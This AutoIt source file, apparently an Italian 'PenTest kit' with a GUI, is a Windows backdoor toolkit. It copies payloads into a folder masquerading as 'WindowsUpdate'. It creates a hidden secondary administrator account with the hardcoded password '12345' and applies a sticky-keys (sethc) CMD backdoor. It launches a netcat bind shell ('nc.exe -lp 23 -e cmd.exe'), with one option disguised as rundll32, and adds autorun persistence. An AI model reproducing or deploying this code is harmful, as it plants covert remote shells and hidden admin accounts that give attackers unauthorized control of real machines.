#comments-start
	There's no place like 127.0.0.1
	Contacts: nederizer@live.it
#comments-end

#region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=n
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Add_Constants=n
#AutoIt3Wrapper_Run_Tidy=y
#endregion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <Inet.au3>
#include <ButtonConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
$PublicIP = "Premi il bottone a lato."
$InternalIP = "Premi il bottone a lato."
#region ### START Koda GUI section ### Form=H:\Scaricati\KODA\Forms\pentest.kxf
$Form1 = GUICreate("Form1", 451, 268, 268, 147)
$Label1 = GUICtrlCreateLabel("PenTest kit by [ S0m3B0dY + N0b0Dy ]", 16, 8, 422, 37)
GUICtrlSetFont(-1, 18, 400, 0, "UnPilgi")
GUICtrlSetColor(-1, 0x000000)
$copiafile = GUICtrlCreateButton("Copia File", 32, 80, 75, 25)
$Group1 = GUICtrlCreateGroup("Passo 1", 24, 56, 89, 57)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group2 = GUICtrlCreateGroup("Passo 2 - EXPLOIT", 128, 56, 313, 201)
$adminadd = GUICtrlCreateButton("Aggiunta account Admin", 144, 80, 129, 25)
$cmdadd = GUICtrlCreateButton("Aggiunta CMD al Login", 280, 80, 153, 25)
$Group3 = GUICtrlCreateGroup("NetCat", 136, 112, 297, 57)
$netcatadd = GUICtrlCreateButton("Installa NetCat", 144, 128, 81, 33)
$netcat = GUICtrlCreateRadio("NetCat standard", 232, 128, 121, 17)
GUICtrlSetState(-1, $GUI_CHECKED)
$rundll = GUICtrlCreateRadio("Falso RUNDLL32.exe", 232, 144, 129, 17)
$Persistenza = GUICtrlCreateButton("Persistenza", 360, 128, 65, 33)
GUICtrlSetState($Persistenza, $GUI_DISABLE)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Label2 = GUICtrlCreateLabel("There's no place like 127.0.0.1", 152, 232, 267, 33)
GUICtrlSetFont(-1, 16, 400, 0, "UnPilgi")
$Label3 = GUICtrlCreateLabel("IP Pubblico:", 152, 184, 61, 17)
$PUB_IP = GUICtrlCreateLabel($PublicIP, 216, 184, 137, 17)
$Label4 = GUICtrlCreateLabel("IP Interno:", 152, 200, 53, 17)
$INT_IP = GUICtrlCreateLabel($InternalIP, 216, 200, 137, 17)
$Group4 = GUICtrlCreateGroup("IPs", 144, 168, 289, 57)
$get_ip = GUICtrlCreateButton("Get IPs", 360, 184, 65, 33)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$infobtn = GUICtrlCreateButton("INFO", 32, 144, 73, 33)
$contact = GUICtrlCreateButton("Contatti", 32, 200, 73, 33)
$version = GUICtrlCreateLabel("v1.3.0 BETA", 8, 248, 64, 15)
GUICtrlSetFont(-1, 8, 400, 0, "MS PMincho")
GUICtrlSetColor(-1, 0x000000)
GUISetState(@SW_SHOW)
#endregion ### END Koda GUI section ###

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit

		Case $copiafile
			$copia1 = FileCopy(@WorkingDir & "\res\*", "C:\WindowsUpdate_33W5K9\", 9)
			If $copia1 = 1 Then MsgBox(0, "Tutto fatto!", "File copiati con successo.")
			If $copia1 = 0 Then MsgBox(0, "Oh, cazzo!", "Errore durante la copiatura dei file.")
		Case $adminadd
			RunWait(@ComSpec & "cscript C:\WindowsUpdate_33W5K9\v4l.wsf", "", @SW_HIDE)
			MsgBox(64, "Tutto fatto!", "Account admin secondario abilitato. Dati per il login:" & @CRLF & "AdminSys:12345" & @CRLF & "Procedo a nascondere l'account...")
			RunWait(@ComSpec & "C:\Windows\regedit /s C:\WindowsUpdate_33W5K9\HIDEADMIN.reg", "", @SW_HIDE)
			MsgBox(48, "OK", "Account nascosto dalla schermata di login. Dati di accesso:" & @CRLF & "AdminSys:12345")
		Case $cmdadd
			RunWait(@ComSpec & "C:\Windows\regedit /s C:\WindowsUpdate_33W5K9\SETHC.reg", "", @SW_HIDE)
		Case $netcatadd
			$netcatchecked = GUICtrlRead($netcat)
			If $netcatchecked = 1 Then
				Run(@ComSpec & "C:\WindowsUpdate_33W5K9\nc.exe -lp 23 -e cmd.exe", "", @SW_HIDE)
				RunWait(@ComSpec & "C:\Windows\regedit /s C:\WindowsUpdate_33W5K9\NCAUTORUN.reg", "", @SW_HIDE)
				MsgBox(0, "NetCat Standard", "Il server NetCat è stato avviato in ascolto sulla porta TCP 23. Output su CMD." & @CRLF & "Aggiunto all'AutoRun (HKEY_LOCAL_MACHINE).")
			EndIf
			$rundllchecked = GUICtrlRead($rundll)
			If $rundllchecked = 1 Then
				Run(@ComSpec & "C:\WindowsUpdate_33W5K9\rundll32b.exe", "", @SW_HIDE)
				RunWait(@ComSpec & "C:\Windows\regedit /s C:\WindowsUpdate_33W5K9\NCMASKAUTORUN.reg", "", @SW_HIDE)
				MsgBox(0, "NetCat Mascherato", "Il server NetCat (rundll32b.exe) è stato avviato in ascolto sulla porta TCP 2482. Output su CMD.")
			EndIf
		Case $netcat
			GUICtrlSetState($Persistenza, $GUI_DISABLE)
		Case $rundll
			GUICtrlSetState($Persistenza, $GUI_ENABLE)
		Case $Persistenza
			Run(@ComSpec & "cscript C:\WindowsUpdate_33W5K9\persist.vbs", "", @SW_HIDE)
			MsgBox(0, "Persistenza NetCat Mascherato", "Avviata persistenza per il server NetCat (rundll32b.exe)." & @CRLF & "Delay tra i controlli: 5 secondi." & @CRLF & @CRLF & "Aggiunto all'AutoRun (HKEY_LOCAL_MACHINE).")
		Case $get_ip
			Local $PublicIP = _GetIP()
			$PUB_IP = GUICtrlCreateLabel($PublicIP, 216, 184, 137, 17)
			If @IPAddress1 = "127.0.0.1" Then
				Sleep(10)
			Else
				$InternalIP = @IPAddress1
			EndIf
			If @IPAddress2 = "0.0.0.0" Then
				Sleep(10)
			Else
				$InternalIP = @IPAddress2
			EndIf
			If @IPAddress3 = "0.0.0.0" Then
				Sleep(10)
			Else
				$InternalIP = @IPAddress3
			EndIf
			If @IPAddress4 = "0.0.0.0" Then
				Sleep(10)
			Else
				$InternalIP = @IPAddress4
			EndIf
			$INT_IP = GUICtrlCreateLabel($InternalIP, 216, 200, 137, 17)
		Case $infobtn
			If Not IsDeclared("iMsgBoxAnswer") Then Local $iMsgBoxAnswer
			$iMsgBoxAnswer = MsgBox(68, "INFO", "Cerchi istruzioni su come usare questo Toolkit? Vuol dire che non lo avresti nemmeno dovuto aprire..." & @CRLF & @CRLF & "Vuoi invece vedere il CHANGELOG?")
			Select
				Case $iMsgBoxAnswer = 6 ;Yes
					MsgBox(32, "CHANGELOG", "v1.3.0 BETA" & @CRLF & "* Creata la GUI" & @CRLF & "* Aggiunta sezione IP" & @CRLF & "* Nascosto Admin secondario" & @CRLF & "* Aggiunto CHANGELOG" & @CRLF & "* Aggiunta label di versione nella GUI")
				Case $iMsgBoxAnswer = 7 ;No
					Sleep(10)
			EndSelect
		Case $contact
			MsgBox(16, "Seriamente?!", "Pensavi davvero di poter trovare un contatto qui, in bella vista?" & @CRLF & "Il decompiler è tuo amico! Piccolo aiutino: Exe2Aut...")
	EndSwitch
WEnd
